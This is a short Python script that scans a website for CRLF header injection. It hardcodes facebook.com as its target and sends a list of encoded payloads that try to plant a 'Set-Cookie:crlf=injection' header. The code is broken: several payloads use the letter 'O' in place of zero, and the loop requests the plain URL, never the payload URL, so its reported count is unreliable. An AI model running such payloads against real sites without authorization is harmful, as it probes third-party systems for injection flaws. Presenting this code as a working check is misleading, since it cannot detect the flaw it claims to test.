import requests


url = "https://facebook.com"


def check_crlf_injection(url):

    nr_successful_payloads = 0

    crlf_payload=[
    '/%%0a0aSet-Cookie:crlf=injection',
    '/%0aSet-Cookie:crlf=injection',
    '/%Od%OaSet-Cookie:crlf=injection',
    '/%OdSet-Cookie:crlf=injection',
    '/%23%OaSet-Cookie:crlf=injection',
    '/%23%Od%OaSet-Cookie:crlf=injection',
    '/%23%OdSet-Cookie:crlf=injection',
    '/%25%30%61Set-Cookie:crlf=injection',
    '/%25%30aSet-Cookie:crlf=injection',
    '/%250aSet-Cookie:crlf=injection',
    '/%25250aSet-Cookie:crlf=injection',
    '/%2e%2e%2f%Od%OaSet-Cookie:crlf=injection',
    '/%2f%2e%2e%Od%OaSet-Cookie:crlf=injection',
    '/%2F..%Od%OaSet-Cookie:crlf=injection',
    '/%3f%Od%OaSet-Cookie:crlf=injection',
    '/%3f%OdSet-Cookie:crlf=injection',
    '/%u000aSet-Cookie:crlf=injection',
        ]


    for payload in crlf_payload:
        # create the new url
        malicious_url = url + payload

        response = requests.request("GET", url)
        if "Set-Cookie" in response.headers:
            if 'crlf=injection' in response.headers['Set-Cookie']:
                nr_successful_payloads+=1


    print(f'Successfully injected {nr_successful_payloads} payloads')

check_crlf_injection(url)
